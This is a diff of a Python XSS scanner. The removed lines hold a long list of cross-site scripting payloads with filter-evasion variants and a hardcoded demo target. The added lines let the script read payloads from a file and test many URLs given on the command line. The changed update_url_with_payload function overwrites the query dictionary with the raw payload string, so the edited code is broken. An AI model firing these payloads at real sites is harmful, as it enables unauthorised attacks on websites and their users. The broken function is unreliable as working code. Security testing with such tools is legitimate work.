@@ -1,119 +1,24 @@
+import argparse
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 import time
 
-xss_payloads = [
-    '<script>alert(1)</script>',  
-    '"><script>alert(1)</script>',  
-    '<img src=x onerror=alert(1)>',  
-    '"><img src=x onerror=alert(1)>',  
-    '<svg/onload=alert(1)>',  
-    '"><svg/onload=alert(1)>', 
-    '><script>alert(1)</script>',
-    '"><scr\0ipt>alert(1)</scr\0ipt>',
-    '"><scr\00ipt>alert(1)</scr\00ipt>',
-    '"><scr\000ipt>alert(1)</scr\000ipt>',
-    '"><scri%00pt>alert(1)</scri%00pt>',
-    '"><scri&#x70;t>alert(1)</scri&#x70;t>',
-    '"><scri%2525pt>alert(1)</scri%2525pt>',
-    '"><scri+pt>alert(1)</scr+ipt>',
-    '"><scri%2bpt>alert(1)</scr%2bipt>',
-    '"><sc%00ript>alert(1)</sc%00ript>',
-    '"><img src=x onerror=alert(1)>',
-    '"><svg/onload=alert(1)>',
-    '"><body onload=alert(1)>',
-    '"><input type=text onfocus=alert(1) autofocus>',
-    '"><button onclick=alert(1)>Click</button>',
-    '"><video src=x onerror=alert(1)>',
-    '"><audio src=x onerror=alert(1)>',
-    '"><iframe src=javascript:alert(1)>',
-    '"><form action=javascript:alert(1)>',
-    '"><textarea onfocus=alert(1) autofocus></textarea>',
-    '"><scr<script>ipt>alert(1)</scr</script>ipt>',
-    '"><img src=x onerror="</script><script>alert(1)</script>">',
-    '"><scri<script>pt>alert(1)</scri</script>pt>',
-    '"><scri</scri><script>pt>alert(1)</script>',
-    '"><scri\0pt><script>alert(1)</script></scri\0pt>',
-    '"><scri%00pt><script>alert(1)</script></scri%00pt>',
-    '"><scri&#x70;t><script>alert(1)</script></scri&#x70;t>',
-    '"><sc\0ript>alert(1)</sc\0ript>',
-    '"><sc%00ript>alert(1)</sc%00ript>',
-    '"><sc&#x70;ript>alert(1)</sc&#x70;ript>',
-    '"><SCript>alert(1)</SCript>',
-    '"><ScRipT>alert(1)</ScRipT>',
-    '"><ScRiPt>alert(1)</ScRiPt>',
-    '"><SCRipt>alert(1)</SCRipt>',
-    '"><scrIPt>alert(1)</scrIPt>',
-    '"><ScrIPT>alert(1)</ScrIPT>',
-    '"><scRIPT>alert(1)</scRIPT>',
-    '"><sCRIPT>alert(1)</sCRIPT>',
-    '"><ScRiPt>alert(1)</ScRiPt>',
-    '"><SCRIpt>alert(1)</SCRIpt>',
-    '"><scri<!-- -->pt>alert(1)</scri<!-- -->pt>',
-    '"><scri/* */pt>alert(1)</scri/* */pt>',
-    '"><scri/**/pt>alert(1)</scri/**/pt>',
-    '"><scri<!-- this is a comment -->pt>alert(1)</scri<!-- this is a comment -->pt>',
-    '"><scri/* this is a comment */pt>alert(1)</scri/* this is a comment */pt>',
-    '"><scri/**/pt>alert(1)</scri/**/pt>',
-    '"><scri%00pt>alert(1)</scri%00pt>',
-    '"><scri%2bpt>alert(1)</scri%2bpt>',
-    '"><scri%2525pt>alert(1)</scri%2525pt>',
-    '"><scri&#x70;t>alert(1)</scri&#x70;t>',
-    '"><script>alert(1)</script>',
-    '"><script>alert&#40;1&#41;</script>',
-    '"><script>alert&#x28;1&#x29;</script>',
-    '"><script>alert%281%29</script>',
-    '"><script>alert%28%31%29</script>',
-    '"><script>%61%6C%65%72%74%28%31%29</script>',
-    '"><script>%61%6C%65%72%74&#x28;1&#x29;</script>',
-    '"><script>alert(1)//</script>',
-    '"><script>alert(1)/*</script>',
-    '"><script>alert(1)//comment</script>',
-    '"><script>confirm(1)</script>',
-    '"><script>prompt(1)</script>',
-    '"><script>eval(\'alert(1)\')</script>',
-    '"><script>setTimeout(\'alert(1)\', 1000)</script>',
-    '"><script>setInterval(\'alert(1)\', 1000)</script>',
-    '"><script>Function(\'alert(1)\')()</script>',
-    '"><script>onerror=alert;throw 1</script>',
-    '"><script>window.onerror=alert;throw 1</script>',
-    '"><script>document.write(\'<script>alert(1)</script>\')</script>',
-    '"><script>document.location=\'javascript:alert(1)\'</script>',
-    '"><img src=x onerror=alert(1)>',
-    '"><svg onload=alert(1)>',
-    '"><input type=text onfocus=alert(1) autofocus>',
-    '"><iframe src=javascript:alert(1)>',
-    '"><object data=javascript:alert(1)>',
-    '"><embed src=javascript:alert(1)>',
-    '"><base href=javascript:alert(1)//>',
-    '"><link rel=stylesheet href=javascript:alert(1)>',
-    '"><meta http-equiv=refresh content="0;url=javascript:alert(1)">',
-    '"><frame src=javascript:alert(1)>',
-    '"><scri%00pt>alert(1)</scri%00pt>',
-    '"><scri%2bpt>alert(1)</scri%2bpt>',
-    '"><scri%2525pt>alert(1)</scri%2525pt>',
-    '"><scri&#x70;t>alert(1)</scri&#x70;t>',
-    '"><scri&#x2bpt>alert(1)</scri&#x2bpt>',
-    '"><scri%25pt>alert(1)</scri%25pt>',
-    '"><scri%252525pt>alert(1)</scri%252525pt>',
-    '"><scri&#x2b%25pt>alert(1)</scri&#x2b%25pt>',
-    '"><scri%25%2bpt>alert(1)</scri%25%2bpt>',
-    '"><scri%252525%2bpt>alert(1)</scri%252525%2bpt>',
-    '"><script>window </script>',
-    '"><script>self </script>',
-    '"><script>this </script>',
-    '"><script>top </script>',
-    '"><script>parent </script>',
-    '"><script>frames </script>',
-    '"><script>globalThis </script>',
-    '"><script>Object </script>',
-    '"><script>Function(\'alert(1)\')()</script>',
-    '"><script>eval(\'ale\' + \'rt(1)\')</script>'
-]
+# Function to read payloads from a file
+def read_payloads(file_path):
+    with open(file_path, 'r') as file:
+        return [line.strip() for line in file.readlines()]
 
-# Target URL
-url = "http://testphp.vulnweb.com/listproducts.php?cat=3"
+# Function to read URLs from a file
+def read_urls(file_path):
+    with open(file_path, 'r') as file:
+        return [line.strip() for line in file.readlines()]
+
+# Define the path to the payloads file
+payloads_file = "payloads.txt"
+
+# Read the payloads from the file
+xss_payloads = read_payloads(payloads_file)
 
 # Function to check for XSS in response
 def check_xss(response, payload):
@@ -147,10 +52,10 @@ def check_xss(response, payload):
     return False
 
 # Function to update URL with the payload
-def update_url_with_payload(url, param, payload):
+def update_url_with_payload(url, payload):
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
-    query_params[param] = payload
+    query_params = payload
     new_query_string = urlencode(query_params, doseq=True)
     updated_url = urlunparse(parsed_url._replace(query=new_query_string))
     return updated_url
@@ -160,7 +65,7 @@ def test_for_xss(url):
     try:
         for payload in xss_payloads:
             # Update the URL with the payload
-            updated_url = update_url_with_payload(url, "cat", payload)
+            updated_url = update_url_with_payload(url, payload)
             try:
                 response = requests.get(updated_url)
                 print(f"Attempt: {updated_url}")
@@ -172,11 +77,17 @@ def test_for_xss(url):
                     
             except requests.RequestException as e:
                 print(f"Request failed for {updated_url}: {e}")
-                time.sleep(1)  # Wait for 1 second before the next attempt
+                
     except KeyboardInterrupt:
         print("\n[!] Keyboard interrupt received. Exiting...")
     except Exception as e:
         print(f"\n[!] An unexpected error occurred: {e}")
+
+# Function to test a list of URLs
+def test_multiple_urls(urls):
+    for url in urls:
+        print(f"Testing URL: {url}")
+        test_for_xss(url)
 
 # Print banner
 def print_banner():
@@ -197,7 +108,22 @@ def print_banner():
     """
     print(banner)
 
-# Run the XSS test
-if __name__ == "__main__":
+# Main function
+def main():
     print_banner()
-    test_for_xss(url)	
+
+    parser = argparse.ArgumentParser(description="XSS Tester")
+    parser.add_argument('-u', '--url', help='Single URL to test for XSS')
+    parser.add_argument('-U', '--urls_file', help='File containing list of URLs to test for XSS')
+    args = parser.parse_args()
+
+    if args.url:
+        test_for_xss(args.url)
+    elif args.urls_file:
+        urls = read_urls(args.urls_file)
+        test_multiple_urls(urls)
+    else:
+        print("Please provide either a single URL with -u or a file containing URLs with -U")
+
+if __name__ == "__main__":
+    main()
